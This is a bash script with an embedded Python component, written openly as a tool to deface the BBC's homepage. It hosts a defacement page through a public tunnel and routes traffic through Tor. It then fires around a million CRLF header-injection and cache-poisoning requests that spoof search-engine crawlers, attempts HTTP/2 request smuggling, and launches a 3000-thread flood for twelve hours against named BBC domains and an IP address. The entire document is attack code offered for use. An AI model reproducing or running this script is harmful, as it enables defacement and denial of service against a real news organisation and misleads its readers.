#!/bin/bash
# BBC_ROOT_DEFACE_KILLER.sh - BBC ROOT HOMEPAGE DEFACE ONLY
# www.bbc.co.uk/ → TRUSTEDF57.html (ROOT DEFACE)
set -euo pipefail

HTML_FILE="TRUSTEDF57.html"
THREADS=3000
DURATION=43200  # 12h
TOR_SPEED=1000  # requests/sec

echo "💀 BBC ROOT DEFACE KILLER - ROOT '/' ONLY"
echo "[+] Verifying $HTML_FILE..."
[[ -f "$HTML_FILE" ]] || { echo "❌ $HTML_FILE missing"; exit 1; }
grep -q TRUSTEDF57 "$HTML_FILE" && echo "✅ TRUSTEDF57 marker OK"

torsocks() { command torsocks --timeout 5000 "$@" 2>/dev/null || "$@"; }

# 1. LOCAL SERVER + SERVE0 TUNNEL
echo "[+] Starting local server..."
python3 -m http.server 8080 --bind 0.0.0.0 > /dev/null 2>&1 &
SERVER_PID=$!
sleep 5

# Serveo tunnel (PUBLIC URL)
ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > tunnel.log 2>&1 &
TUNNEL_PID=$!
sleep 15

DEFACE_URL=$(grep -oE 'https://[a-z0-9-]+\.serveo\.net' tunnel.log | tail -1)/$HTML_FILE
echo "🌐 PUBLIC DEFACE: $DEFACE_URL"
torsocks curl -s "$DEFACE_URL" | head -1

# 2. ROOT POISON PAYLOADS (www.bbc.co.uk/ ONLY)
ROOT_TARGETS=(
    "https://www.bbc.co.uk/"
    "https://bbc.co.uk/"
    "https://www.bbc.com/"
    "http://132.185.210.70:80/"
)

PAYLOADS=(
    "%0d%0aLocation:%20$DEFACE_URL%0d%0aContent-Type:%20text/html%0d%0aCache-Control:%20public,max-age=86400"
    "%0aLocation:%20$DEFACE_URL%0aSet-Cookie:%20defaced=TRUSTEDF57;path=/"
    "Location:$DEFACE_URL%0d%0aX-Redirect:%20$DEFACE_URL%0d%0a"
)

BOTS=(
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.googlebot.com/bot.html)"
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

echo "[+] ROOT POISONING BBC '/' (1M+ requests)..."
for i in {1..1000000}; do
    target=${ROOT_TARGETS[$((i%4))]}
    payload=${PAYLOADS[$((i%3))]}
    bot=${BOTS[$((i%4))]}
    
    torsocks curl -s --max-time 2 "$target?q=$payload" \
        -H "User-Agent: $bot" \
        -H "X-Forwarded-Host: www.bbc.co.uk" \
        -H "Host: www.bbc.co.uk" \
        -H "Cache-Control: no-cache" &
    
    [[ $((i%1000)) -eq 0 ]] && echo "[+] $i/1M shots → $(date)"
done
wait

# 3. HTTP/2 SMUGGLING ROOT
echo "[+] HTTP/2 SMUGGLING ROOT..."
torsocks h2csmuggle -u "https://www.bbc.co.uk/" -p "%0d%0aLocation: $DEFACE_URL" -t 1000 || \
torsocks curl -s --http2 "$target/GET%20/%20HTTP/1.1%0d%0aHost:%20www.bbc.co.uk%0d%0a%0aGET%20/?q=$payload%20HTTP/1.1"

# 4. ROOT DESTROYER PYTHON (3000 THREADS)
cat > bbc_root_destroyer.py << 'EOF'
import requests, threading, time, random, sys
from urllib.parse import quote

ROOT_TARGETS = [
    "https://www.bbc.co.uk/",
    "https://bbc.co.uk/",
    "https://www.bbc.com/",
    "http://132.185.210.70:80/"
]

DEFACE = sys.argv[1]
THREADS = int(sys.argv[2])
DURATION = int(sys.argv[3])

BOTS = [
    "Googlebot/2.1", "bingbot/2.0", "Mozilla/5.0", "Yahoo! Slurp",
    "facebookexternalhit/1.1", "Twitterbot/1.0"
]

def root_poison():
    s = requests.Session()
    s.headers.update({'Cache-Control': 'no-cache'})
    while True:
        try:
            t = random.choice(ROOT_TARGETS)
            payload = f"%0d%0aLocation: {DEFACE}%0d%0aContent-Type: text/html"
            s.get(f"{t}?q={payload}", 
                  headers={'User-Agent': random.choice(BOTS),
                          'X-Forwarded-For': '127.0.0.1',
                          'Host': 'www.bbc.co.uk'},
                  timeout=1.5)
        except: pass

print(f"💀 BBC ROOT DESTROYER | {THREADS} THREADS → {DEFACE}")
threads = []
for _ in range(THREADS):
    t = threading.Thread(target=root_poison, daemon=True)
    t.start()
    threads.append(t)

time.sleep(DURATION)
print("✅ BBC ROOT DEFACE COMPLETE")
EOF

nohup python3 bbc_root_destroyer.py "$DEFACE_URL" $THREADS $DURATION > root_destroy.log 2>&1 &
DESTROY_PID=$!

# 5. ROOT VERIFICATION LOOP
echo ""
echo "🎯 BBC ROOT DEFACE MONITOR - www.bbc.co.uk/ ONLY"
echo "Press Ctrl+C to stop"
trap "kill $SERVER_PID $TUNNEL_PID $DESTROY_PID 2>/dev/null; echo '🛑 Stopped'; exit" INT

while true; do
    clear
    echo "💀 BBC ROOT '/' DEFACE STATUS - $(date)"
    echo "═══════════════════════════════════════════════════"
    echo "🔗 LIVE DEFACE: $DEFACE_URL"
    echo ""
    
    for target in "${ROOT_TARGETS[@]}"; do
        echo "📍 Testing $target..."
        RESPONSE=$(torsocks curl -s -I "$target?q=test" 2>/dev/null | grep -iE "(location|content-type|set-cookie)" | head -3 || echo "NO RESPONSE")
        if [[ "$RESPONSE" == *"TRUSTEDF57"* ]] || [[ "$RESPONSE" == *"$DEFACE_URL"* ]]; then
            echo "✅ ROOT DEFACE SUCCESS! → $RESPONSE"
        else
            echo "⏳ Poisoning... → $RESPONSE"
        fi
    done
    
    echo ""
    echo "📊 STATS:"
    echo "  Server: $(ps -p $SERVER_PID -o pid,state= | tail -1 || echo DEAD)"
    echo "  Tunnel: $(ps -p $TUNNEL_PID -o pid,state= | tail -1 || echo DEAD)"
    echo "  Destroyer: $(ps -p $DESTROY_PID -o pid,state= | tail -1 || echo DEAD)"
    echo "  Requests/sec: $(grep -c . root_destroy.log || echo 0)"
    
    sleep 10
done
